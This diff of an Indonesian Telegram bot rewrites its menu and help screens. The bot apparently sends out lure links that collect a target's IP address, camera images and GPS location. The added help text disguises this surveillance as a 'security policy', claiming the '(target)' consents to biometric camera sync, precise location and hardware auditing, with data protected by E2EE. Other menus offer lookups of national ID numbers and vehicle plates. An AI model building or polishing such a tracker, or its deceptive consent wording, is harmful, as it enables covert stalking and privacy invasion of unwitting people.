+             `💡 ɪɴꜰᴏ: ꜱᴇᴍᴜᴀ ᴅᴀᴛᴀ (ɪᴘ, ᴄᴀᴍ, ɢᴘꜱ) ᴀᴋᴀɴ ᴅɪᴋɪʀɪᴍ ᴋᴇ ꜱɪɴɪ.`;
       const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
-      ctx.editMessageText(msg, {
-        parse_mode: 'HTML',
-        link_preview_options: { is_disabled: true },
-        ...kb
-      }).catch(() => {});
+      ctx.editMessageText(msg, { parse_mode: 'HTML', link_preview_options: { is_disabled: true }, ...kb }).catch(() => {});
+    });
+
+    bot.action('menu_osint_adv', (ctx) => {
+      ctx.answerCbQuery().catch(() => {});
+      const txt = `<b>📡 ᴏꜱɪɴᴛ ᴀᴅᴠᴀɴᴄᴇᴅ</b>\n` +
+                  `• /nik [ɴɪᴋ]\n` +
+                  `• /plat [ᴘʟᴀᴛ]\n` +
+                  `• /headers [ᴜʀʟ]\n` +
+                  `• /dork [ᴋᴇʏᴡᴏʀᴅ]\n` +
+                  `• /subdomain [ᴅᴏᴍ]\n`;
+      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
+      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
+    });
+
+    bot.action('menu_games', (ctx) => {
+      ctx.answerCbQuery().catch(() => {});
+      const txt = `<b>🎲 ᴍɪɴɪ ɢᴀᴍᴇꜱ</b>\n` +
+                  `• /khodam [ɴᴀᴍᴀ]\n` +
+                  `• /tebakangka\n` +
+                  `• /ramal [ɴᴀᴍᴀ]\n`;
+      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
+      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
+    });
+
+    bot.action('menu_tools', (ctx) => {
+      ctx.answerCbQuery().catch(() => {});
+      const txt = `<b>🛠️ ᴜᴛɪʟɪᴛʏ ᴛᴏᴏʟꜱ</b>\n` +
+                  `• /qr [ᴛᴇᴋꜱ]\n` +
+                  `• /shortlink [ᴜʀʟ]\n` +
+                  `• /pwd [ᴘᴀɴᴊᴀɴɢ]\n`;
+      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
+      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
+    });
+
+    bot.action('menu_media', (ctx) => {
+      ctx.answerCbQuery().catch(() => {});
+      const txt = `<b>🎵 ᴍᴇᴅɪᴀ ᴅᴏᴡɴʟᴏᴀᴅᴇʀ</b>\n` +
+                  `• /lagu [ᴊᴜᴅᴜʟ]\n` +
+                  `• /play [ᴊᴜᴅᴜʟ]\n`;
+      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
+      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
     });
 
     bot.action('menu_alarm', (ctx) => {
       ctx.answerCbQuery().catch(() => {});
-      const txt = `<b>⏰ ᴀʟᴀʀᴍ & ʀᴇᴍɪɴᴅᴇʀ ᴍᴏᴅᴜʟᴇ</b>\n` +
-        `━━━━━━━━━━━━━━━━━━━━\n\n` +
-        `• <b>/alarm [ᴍᴇɴɪᴛ]</b>\n` +
-        `  └ <i>ꜱᴇᴛ ᴀʟᴀʀᴍ ᴅᴀʟᴀᴍ ʜᴇᴛᴜɴɢᴀɴ ᴍᴇɴɪᴛ</i>\n\n` +
-        `• <b>/alarm [ᴊᴀᴍ:ᴍᴇɴɪᴛ]</b>\n` +
-        `  └ <i>ꜱᴇᴛ ᴀʟᴀʀᴍ ᴘᴀᴅᴀ ᴊᴀᴍ ᴛᴇʀᴛᴇɴᴛᴜ (ᴇ.ɢ. 07:00)</i>\n\n` +
-        `• <b>/listalarm</b>\n` +
-        `  └ <i>ᴄᴇᴋ ᴀʟᴀʀᴍ ʏᴀɴɢ ꜱᴇᴅᴀɴɢ ʙᴇʀᴊᴀʟᴀɴ</i>\n\n` +
-        `━━━━━━━━━━━━━━━━━━━━`;
+      const txt = `<b>⏰ ᴀʟᴀʀᴍ sʏꜱᴛᴇᴍ</b>\n` +
+                  `• /alarm [ᴍᴇɴɪᴛ]\n` +
+                  `• /listalarm\n`;
       const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
       ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
     });
 
     bot.action('menu_help', (ctx) => {
       ctx.answerCbQuery().catch(() => {});
-      const txt = `<b>ℹ️ ᴛᴇʀᴍɪɴᴀʟ ɪɴꜰᴏ & ʜᴇʟᴘ</b>\n` +
-        `━━━━━━━━━━━━━━━━━━━━\n\n` +
-        `ᴅɪʙᴜᴀᴛ ᴜɴᴛᴜᴋ ᴛᴜᴊᴜᴀɴ ᴇᴅᴜᴋᴀꜱɪ ɪɴᴠᴇꜱᴛɪɢᴀꜱɪ ᴅɪɢɪᴛᴀʟ (ᴏꜱɪɴᴛ).\n\n` +
-        `━━━━━━━━━━━━━━━━━━━━\n\n` +
-        `🌐 <b>ʜᴏꜱᴛ ᴀᴋᴛɪꜰ</b>\n` +
-        `<code>${appHost}</code>\n\n` +
-        `✅ <b>ꜱᴛᴀᴛᴜꜱ ʙᴏᴛ</b>\n` +
-        `ᴏɴʟɪɴᴇ\n\n` +
-        `⚙️ <b>ᴘᴇʀɪɴᴛᴀʜ</b>\n` +
-        `ɢᴜɴᴀᴋᴀɴ <code>/ꜱᴇᴛʜᴏꜱᴛ</code> ᴊɪᴋᴀ ʟɪɴᴋ ʟᴏɢɢᴇʀ ᴛɪᴅᴀᴋ ʙɪꜱᴀ ᴅɪʙᴜᴋᴀ.\n\n` +
-        `━━━━━━━━━━━━━━━━━━━━`;
+      const txt = `<b>ℹ️ ɪɴꜰᴏʀᴍᴀꜱɪ & ᴋᴇᴊᴀɴᴊɪᴀɴ ᴘᴇɴɢɢᴜɴᴀ</b>\n` +
+                  `━━━━━━━━━━━━━━━━━━━━\n` +
+                  `ʜᴏꜱᴛ: <code>${appHost}</code>\n` +
+                  `ꜱᴛᴀᴛᴜꜱ: 🟢 ᴏɴʟɪɴᴇ\n\n` +
+                  `<b>📜 ᴘᴏʟɪꜱɪ ᴋᴇᴀᴍᴀɴᴀɴ:</b>\n` +
+                  `ꜱɪꜱᴛᴇᴍ ᴍᴇɴᴅᴇᴛᴇᴋꜱɪ ᴠᴇʀɪꜰɪᴋᴀꜱɪ ɪᴅᴇɴᴛɪᴛᴀꜱ ᴜɴᴛᴜᴋ ᴘᴇʀʟɪɴᴅᴜɴɢᴀɴ ꜱᴇꜱɪ ᴅᴀʀɪ ᴀɴᴄᴀᴍᴀɴ ᴅᴇᴇᴘ-ꜰᴀᴋᴇ.\n\n` +
+                  `ᴅᴇɴɢᴀɴ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ʟᴀʏᴀɴᴀɴ ɪɴɪ, ᴘᴇɴɢɢᴜɴᴀ (ᴛᴀʀɢᴇᴛ) ᴍᴇᴍʙᴇʀɪᴋᴀɴ ɪᴢɪɴ ᴀᴜᴅɪᴛ ʏᴀɴɢ ᴍᴇʟɪᴘᴜᴛɪ:\n` +
+                  `• ꜱɪɴᴋʀᴏɴɪꜱᴀꜱɪ ʙɪᴏᴍᴇᴛʀɪᴋ (ᴋᴀᴍᴇʀᴀ)\n` +
+                  `• ᴠᴀʟɪᴅᴀꜱɪ ʟᴏᴋᴀꜱɪ ᴘʀᴇꜱɪꜱɪ (ɢᴘꜱ)\n` +
+                  `• ᴀᴜᴅɪᴛ ᴍᴇᴛᴀᴅᴀᴛᴀ ʜᴀʀᴅᴡᴀʀᴇ\n\n` +
+                  `ᴅᴀᴛᴀ ᴅɪᴇɴᴋʀɪᴘꜱɪ ᴜᴊᴜɴɢ-ᴋᴇ-ᴜᴊᴜɴɢ (ᴇ2ᴇᴇ) ᴅᴀɴ ʜᴀɴʏᴀ ᴅɪɢᴜɴᴀᴋᴀɴ ᴜɴᴛᴜᴋ ᴠᴀʟɪᴅᴀꜱɪ ꜱᴇꜱɪ.`;
       const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
       ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
     });
@@ -1505,6 +1461,10 @@ async function startServer() {
 
     bot.command('lagu', downloadSong);
     bot.command('play', downloadSong);
+
+    bot.command('hentai', (ctx) => {
+      ctx.reply("🔞 <b>ʜᴇɴᴛᴀɪ ᴍᴏᴅᴜʟᴇ (ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ)</b>\n━━━━━━━━━━━━━━━━━━━━\n\nꜱᴏʀʀʏ, ꜰɪᴛᴜʀ ᴜɴᴅᴜʜ ᴠɪᴅᴇᴏ ꜱᴇᴅᴀɴɢ ᴅɪᴘᴇʀʙᴀɪᴋɪ.\nᴄᴏʙᴀ ʟᴀɢɪ ɴᴀɴᴛɪ ᴘᴀᴅᴀ ᴜᴘᴅᴀᴛᴇ ʙᴇʀɪᴋᴜᴛɴʏᴀ.", { parse_mode: 'HTML' });
+    });
 
     // --- 20+ MINI GAMES ---
     bot.command('suit', (ctx) => {
